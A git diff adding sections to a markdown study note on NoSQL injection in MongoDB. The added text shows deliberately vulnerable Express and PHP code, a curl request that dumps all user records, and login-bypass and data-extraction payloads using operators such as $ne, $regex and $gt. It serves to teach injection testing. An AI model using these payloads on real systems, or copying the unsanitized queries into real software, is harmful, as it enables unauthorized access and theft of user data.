@@ -1,6 +1,10 @@
 # NoSQL Injection 
 - [Introduction](#introduction)
     - [MongoDB](#mongodb)
+    - [What is NoSQL Injection?](#what-is-nosql-injection)
+- [Bypassing Authentication](#bypassing-authentication)
+- [In-Band Data Extraction](#in-band-data-extraction)
+
 
 
 
@@ -227,3 +231,141 @@ academy> db.apples.replaceOne({type:'Pink Lady'}, {name: 'Pink Lady', price: 0.9
 academy> db.apples.remove({price: {$lt: 0.8}})
 { acknowledged: true, deletedCount: 2 }
 ```
+
+### What is NoSQL Injection?
+- When user input is incorporated into a NoSQL query without being properly sanitized first, NoSQL injection may occur.
+- If an attacker can control part of the query, they may subvert the logic and get the server to carry out unintended actions / return unintended results.
+
+#### Scenario
+```javascript
+// Express is a Web-Framework for Node.JS
+const express = require('express');
+const app = express();
+app.use(express.json()); // Tell Express to accept JSON request bodies
+
+// MongoDB driver for Node.JS and the connection string
+// for our local MongoDB database
+const {MongoClient} = require('mongodb');
+const uri = "mongodb://127.0.0.1:27017/test";
+const client = new MongoClient(uri);
+
+// POST /api/v1/getUser
+// Input (JSON): {"username": <username>}
+// Returns: User details where username=<username>
+app.post('/api/v1/getUser', (req, res) => {
+    client.connect(function(_, con) {
+        const cursor = con
+            .db("example")
+            .collection("users")
+            .find({username: req.body['username']});
+        cursor.toArray(function(_, result) {
+            res.send(result);
+        });
+    });
+});
+
+// Tell Express to start our server and listen on port 3000
+app.listen(3000, () => {
+  console.log(`Listening...`);
+});
+```
+- The problem is that the server blindly uses whatever we give it as the username query without any filters or checks. Below is an example of code that is vulnerable to NoSQL injection:
+```javascript
+.find({username: req.body['username']});
+```
+- A simple example of exploiting this injection vulnerability is using the `$regex` operator described in the previous section to coerce the server into returning the information of all users (whose usernames match `/.*/`), like this:
+```bash
+[!bash!]$ curl -s -X POST http://127.0.0.1:3000/api/v1/getUser -H 'Content-Type: application/json' -d '{"username": {"$regex": ".*"}}' | jq
+
+[
+  {
+    "_id": "63667302b7417b0045435139",
+    "username": "bmdyy",
+    "password": "f25a2fc72690b780b2a14e140ef6a9e0",
+    "role": 0,
+    "email": "football55@gmail.com"
+  },
+  {
+    "_id": "63667326b7417b004543513a",
+    "username": "gerald1992",
+    "password": "0f626d75b12f77ede3822843320ed7eb",
+    "role": 1,
+    "email": "g.sanchez@yahoo.com"
+  }
+]
+```
+
+#### Types of NoSQL Injection
+- If you are familiar with SQL injection, then you will already be familiar with the various classes of injections that we may encounter:
+
+    - In-Band: When the attacker can use the same channel of communication to exploit a NoSQL injection and receive the results. The scenario from above is an example of this.
+    - Blind: This is when the attacker does not receive any direct results from the NoSQL injection, but they can infer results based on how the server responds.
+    - Boolean: Boolean-based is a subclass of blind injections, which is a technique where attackers can force the server to evaluate a query and return one result or the other if it is True or False.
+    - Time-Based: Time-based is the other subclass of blind injections, which is when attackers make the server wait for a specific amount of time before responding, usually to indicate if the query is evaluated as True or False.
+
+## Bypassing Authentication
+- On the server-side, the authentication function these parameters are being passed to looks like this:
+```php
+...
+if ($_SERVER['REQUEST_METHOD'] === "POST"):
+    if (!isset($_POST['email'])) die("Missing `email` parameter");
+    if (!isset($_POST['password'])) die("Missing `password` parameter");
+    if (empty($_POST['email'])) die("`email` can not be empty");
+    if (empty($_POST['password'])) die("`password` can not be empty");
+
+    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
+    $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
+    $cursor = $manager->executeQuery('mangomail.users', $query);
+        
+    if (count($cursor->toArray()) > 0) {
+        ...
+```
+- A straightforward way to inject would be to use the `$ne` query operator on both email and password to match values that are not equal to something we know doesn't exist. To put it in words, we want a query that matches email is not equal to 'test@test.com', and the password is not equal to 'test'.
+```bash
+db.users.find({
+    email: {$ne: "test@test.com"},
+    password: {$ne: "test"}
+});
+```
+
+> [!NOTE]
+> Since email and password are being passed as URL-encoded parameters, we can't just pass JSON objects; we need to change the syntax slightly. 
+> When passing URL-encoded parameters to PHP, `param[$op]=val` is the same as `param: {$op: val}` so we will try to bypass authentication with `email[$ne]=test@test.com` and `password[$ne]=test`
+
+- Another way would be to use the `$regex` query parameter on both fields to match `.*`, which means any character repeated 0 or more times and therefore matches everything.
+
+```bash
+db.users.find({
+    email: {$regex: /.*/},
+    password: {$regex: /.*/}
+});
+```
+
+- Some other payloads that would work are:
+
+    - `email=admin%40mangomail.com&password[$ne]=x`: This assumes we know the admin's email and we wanted to target them directly
+    - `email[$gt]=&password[$gt]=`: Any string is 'greater than' an empty string
+    - `email[$gte]=&password[$gte]=`: Same logic as above
+
+## In-Band Data Extraction
+- In traditional SQL databases, in-band data extraction vulnerabilities can often lead to the entire database being exfiltrated. 
+- In MongoDB, however, since it is a non-relational database and queries are performed on specific collections, attacks are (usually) limited to the collection the injection applies to.
+
+- On the server side, the request being made will likely query the database to find documents that have a name matching `$_GET['q']`, like this:
+```bash
+db.types.find({
+    name: $_GET['q']
+});
+```
+- We want to list out information for all types in the collection, and assuming our assumption of how the back-end handles our input is correct, we can use a RegEx query that will match everything like this:
+```bash
+db.types.find({
+    name: {$regex: /.*/}
+});
+```
+### Alternative Queries
+- `name: {$ne: 'doesntExist'}`: Assuming doesntExist doesn't match any documents' names, this will match all documents.
+- `name: {$gt: ''}`: This matches all documents whose name is 'bigger' than an empty string.
+- `name: {$gte: ''}`: This matches all documents whose name is 'bigger or equal to' an empty string.
+- `name: {$lt: '~'}`: This compares the first character of name to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters.
+- `name: {$lte: '~'}`: Same logic as above, except it additionally matches documents whose names start with `~`.
